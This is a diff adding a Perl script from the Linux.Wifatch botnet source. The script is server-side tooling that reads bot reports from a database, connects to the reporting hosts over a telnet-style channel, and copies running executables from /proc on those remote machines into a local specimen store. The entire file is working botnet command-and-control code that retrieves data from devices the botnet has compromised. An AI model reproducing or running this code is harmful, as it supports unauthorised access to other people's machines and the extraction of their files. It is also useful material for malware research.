@@ -1,0 +1,183 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# download specimens not yet known, as reported by the botnet
+# also write a small list of most-commonly misreported files,
+# so backchannel messages cna be avoided.
+
+$| = 1;
+
+use lib "/mnt/u1/hen57/hak";
+
+use Errno    ();
+use CBOR::XS ();
+use JSON::XS ();
+use Coro;
+use EV          ();
+use Digest::SHA ();
+
+use strict;
+use bm::crypto;
+use bm::file;
+use bm::tn;
+use bn::io;
+use bm::sql;
+use bm::meta;
+use bm::nolimits;
+
+use Data::Dump;
+
+our $MAX_FAILS = 5;
+our %DUPCOUNT;
+our $DUPCOUNT_EVERY = 3600 * 4;
+our $DUPCOUNT_TOP   = 16;
+our $DUPCOUNT_CLEN  = 12;         # 12 bytes per sha
+
+my @malcat = qw(
+	.
+	dynamic
+	innocent
+	malware
+	suspicious
+	notelf
+	corruptelf
+);
+
+$| = 1;
+
+my @join;
+my $cache = eval {bm::meta::cbor_load "specimen/cache.cbor"};
+my $queue = new Coro::Channel 4;
+
+sub nukeback
+{
+	sql_exec "update back set type = '', data = '' where id = ?", shift;
+}
+
+my $file_lock = new Coro::SemaphoreSet 1;
+my $host_lock = new Coro::SemaphoreSet 1;
+
+my %fail;
+
+our $dupcount_writer = AE::timer $DUPCOUNT_EVERY, $DUPCOUNT_EVERY, sub {
+	my @top =
+		map {substr $_->[1], 0, $DUPCOUNT_CLEN}
+		sort {$a->[0] <=> $b->[0]}
+		map [$DUPCOUNT{$_}, $_],
+		keys %DUPCOUNT;
+
+	bm::meta::cbor_save "specimen/dupes.cbor", [splice @top, 0, $DUPCOUNT_TOP];
+	bm::meta::cbor_save "specimen/dupcount.cbor", \%DUPCOUNT;
+
+	#	%DUPCOUNT = ();
+};
+
+for (1 .. 32) {
+	async {
+		bm::sql::perthread;
+
+		while (my $job = $queue->get) {
+			my ($file_guard, $id, $host, $pid, $path, $sha) = @$job;
+
+			my $host_guard = $host_lock->guard($host);
+
+			if ($fail{$host} >= $MAX_FAILS) {
+				nukeback $id;
+				next;
+			}
+
+			if (my $tn = new bm::tn $host) {
+				delete $fail{$host};
+
+				my $file = $tn->read_file($pid == 0 ? $pid : "/proc/$pid/exe");
+
+				if ($sha eq Digest::SHA::sha256 $file) {
+					warn "$host $pid new specimen\n";
+
+					my $hex = unpack "H*", $sha;
+					open my $fh, ">", "specimen/$hex.bin~" or die;
+					syswrite $fh, $file;
+
+					open my $fh, ">", "specimen/$hex.meta~" or die;
+					syswrite $fh, JSON::XS->new->utf8->encode([$host, $pid, $path, time]);
+
+					rename "specimen/$hex.bin~",  "specimen/$hex.bin";
+					rename "specimen/$hex.meta~", "specimen/$hex.meta";
+
+				} else {
+					warn "$host $pid sha mismatch\n";
+					nukeback $id;
+				}
+			} else {
+				warn "$host no connect\n";
+				nukeback $id;
+
+				if (++$fail{$host} >= $MAX_FAILS) {
+					print "$host: 5 consecutive failures, killing\n";
+					sql_exec "update back set type = '', data = '' where ip = ? and type != ''", $host;
+				}
+			}
+		}
+	}
+}
+
+async {
+	bm::sql::perthread;
+
+	while () {
+		my $st = sql_exec
+			\my ($id, $host, $port, $data),
+			"select id, ip, port, data from back where type = 'spec' and time < ?",
+			AE::now - 300;
+
+		print "feed ", $st->rows, "\n";
+
+	pid:
+		while ($st->fetch) {
+			my ($pid, $path, $sha) = @{ CBOR::XS::decode_cbor $data };
+
+			for my $cat (@malcat) {
+				my $meta = "specimen/$cat/" . (unpack "H*", $sha) . ".meta";
+				if (-e $meta) {
+					utime undef, undef, $meta;
+					print "$host:$port $pid $path - $cat\n";
+					++$DUPCOUNT{$sha};
+					nukeback $id;
+					next pid;
+				}
+			}
+
+			$file_lock->count($sha) > 0
+				or next;
+
+			my $file_guard = $file_lock->guard($sha);
+
+			$queue->put([$file_guard, $id, $host, $pid, $path, $sha]);
+		}
+
+		print "sleep\n";
+		Coro::AnyEvent::sleep($st->rows >= 10 ? 10 : 90);
+	}
+};
+
+#bm::meta::cbor_save "specimen/cache.cbor", $cache;
+
+EV::run;
+
